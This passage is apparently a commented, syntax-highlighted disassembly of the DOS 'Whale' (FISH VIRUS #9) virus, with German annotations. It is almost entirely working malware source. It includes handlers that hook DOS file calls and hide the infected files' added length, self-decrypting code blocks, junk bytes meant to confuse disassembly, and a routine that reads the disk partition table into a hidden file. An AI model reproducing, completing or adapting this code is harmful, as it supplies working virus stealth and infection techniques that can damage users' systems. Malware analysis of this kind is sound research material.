                                   </span><span class="sc1">; nicht funktioniert...</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">020Ch</span><span class="sc0">   </span><span class="sc1">; AX = EDCF</span><span class="sc0">
</span><span class="sc1">;*********************************************************************</span><span class="sc0">
</span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">EIN_RETURN</span><span class="sc0">      </span><span class="sc1">;************ EingefÅgt **********************</span><span class="sc0">
</span><span class="sc1">;*********************************************************************</span><span class="sc0">
</span><span class="sc5">J02CFF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; -&gt;  RET</span><span class="sc0">
                                   </span><span class="sc1">; ABER RET [SP+2] !!!!!</span><span class="sc0">
                                   </span><span class="sc1">; das heisst : Ende der Trace-Routine</span><span class="sc0">
                                   </span><span class="sc1">; ist hier.</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02D00</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02D60</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================( Handler fÅr Findfirst/Findnext FCB / AH=11 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02D04</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; CALL INT 21H</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">19</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J02D1C</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">IRET_Int21h</span><span class="sc0">
                </span><span class="sc1">;------------------</span><span class="sc0">
</span><span class="sc5">J02D1C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetDTA</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">   </span><span class="sc1">; Extended FCB ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J02D34</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; dann Attribut -&gt; AL</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">07h</span><span class="sc0">                 </span><span class="sc1">; und zum Normalen FCB</span><span class="sc0">
</span><span class="sc5">J02D34</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24F0</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc1">; reserved..Shit</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">20</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J02D46</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">                  </span><span class="sc1">; fertig</span><span class="sc0">

</span><span class="sc5">J02D46</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Dh</span><span class="sc4">],</span><span class="sc5">Code_len</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J02D54</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">                  </span><span class="sc1">; fertig</span><span class="sc0">

</span><span class="sc5">J02D54</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Dh</span><span class="sc4">],</span><span class="sc5">Code_len</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1Fh</span><span class="sc4">],+</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">                  </span><span class="sc1">; fertig</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02D60</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J02D66</span><span class="sc0">          </span><span class="sc1">; wenn CX &lt;&gt; 0 dann J02D66</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03251</span><span class="sc0">          </span><span class="sc1">; sonst J03251 -&gt; J034D4</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc0">            </span><span class="sc1">; TRASH !</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J02D66</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02FA2</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===============================================( Suche nach Fish )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Suche_Fish</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">    </span><span class="sc1">; Hole Zufallszahl</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">    </span><span class="sc1">; ist sie &lt; 40h, dann Partitionstabelle</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">21</span><span class="sc0">        </span><span class="sc1">; lesen und FISH.TBL erzeugen</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J02D7F</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02E9F</span><span class="sc0">    </span><span class="sc1">; sonst nicht.</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;============( LESEN der Partitionstabelle bei jeder 4. Infektion )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02D7F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">22</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">          </span><span class="sc1">; EINEN SEKTOR</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">          </span><span class="sc1">; LESEN</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; NACH ES:0000h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; SPUR 0</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">          </span><span class="sc1">; SEKTOR 1 ( Partitionstabelle )</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; 1. HEAD</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; 1. FESTPLATTE</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; INT 13h !</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">22</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J02DA9</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02E9F</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=========================( erzeugen der FISH.TBL als HIDDEN-File )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02DA9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc0">                  </span><span class="sc1">; CREATE NEW FILE</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">                </span><span class="sc1">; ATTRIBUT "SYSTEM"</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">D2DDB</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                                                </span><span class="sc1">; NAME IN DS:05CBH/CS:D2DDB</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J02DC2</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02E9B</span><span class="sc0">
</span><span class="sc5">J02DC2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; schreibe</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">                </span><span class="sc1">; 200h Byte</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">                </span><span class="sc1">; ab ES:0000</span><span class="sc0">
                                                </span><span class="sc1">; Partitionstabelle</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J02DD8</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02E85</span><span class="sc0">
</span><span class="sc5">J02DD8</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02E9B</span><span class="sc0">
        </span><span class="sc1">;=============================================================</span><span class="sc0">
</span><span class="sc5">D2DDB</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"C:\FISH-#9.TBL"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">D2DEA</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"FISH VIRUS #9  "</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"A Whale is no Fish! "</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Mind her Mutant Fish and the hidden Fish Eggs for "</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"they are damaging. "</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"The sixth Fish mutates only if Whale is in her Cave"</span><span class="sc0">
        </span><span class="sc1">;=============================================================</span><span class="sc0">
</span><span class="sc5">J02E85</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">009Bh</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">D2DEA</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J02E9B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">J02E9B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">23</span><span class="sc0">
</span><span class="sc5">J02E9F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J02EA3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">IRET_Int21h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================( Handler fÅr OPEN FCB , AH = 0F )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02EA9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc1">;==============================</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">          </span><span class="sc1">; fertig</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J02EA3</span><span class="sc0">          </span><span class="sc1">; fertig</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc5">Code_len</span><span class="sc0">   </span><span class="sc1">; unerkannt</span><span class="sc0">
                                                        </span><span class="sc1">; bleiben</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">          </span><span class="sc1">; fertig</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=============================( Handler fÅr Read Random Block FCB )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02ED8</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc5">J02F08</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================( Handler fÅr Read Random FCB )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02EDA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">25</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">21h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">SI</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">23h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">25</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J02F08</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02F03</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0e8h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================( Handler fÅr Read Seq. FCB.AH=14)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02EF0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; DS:DX ist Adresse des geîffneten FCB</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">J02EFA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">26</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J02F08</span><span class="sc0">

</span><span class="sc5">J02F03</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0397A</span><span class="sc0">          </span><span class="sc1">; SAVEREGS,ES=DS, DI=DX+0Dh</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J02F55</span><span class="sc0">          </span><span class="sc1">; Datei ist ausfÅhrbar</span><span class="sc0">
</span><span class="sc5">J02F08</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02B8B</span><span class="sc0">          </span><span class="sc1">; sonst : CALL LOW-INT-21</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02F0B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03251</span><span class="sc0">          </span><span class="sc1">; -&gt; J034D4</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------(trash)---</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;------------------------( erste Proc nach Initialisierung von SI )---</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J02F15</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">; SI = 2810h / VirStart</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; PUSH 0 auf Stack</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc2">0020h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">              </span><span class="sc1">; DS = 0000</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">BP</span><span class="sc0">           </span><span class="sc1">; CX = 0020</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">             </span><span class="sc1">; GET IP</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; BX = 2F27</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">              </span><span class="sc1">; DX = 2F27</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">              </span><span class="sc1">; AX = CS</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">        </span><span class="sc1">; AX = CS:0100</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">

</span><span class="sc5">J02F33</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">@FB88</span><span class="sc0">        </span><span class="sc1">; ADD SI,478h; SI = 2C88</span><span class="sc0">
                                        </span><span class="sc1">; AX = 5BC0</span><span class="sc0">
                                        </span><span class="sc1">; BX = 8AE7</span><span class="sc0">
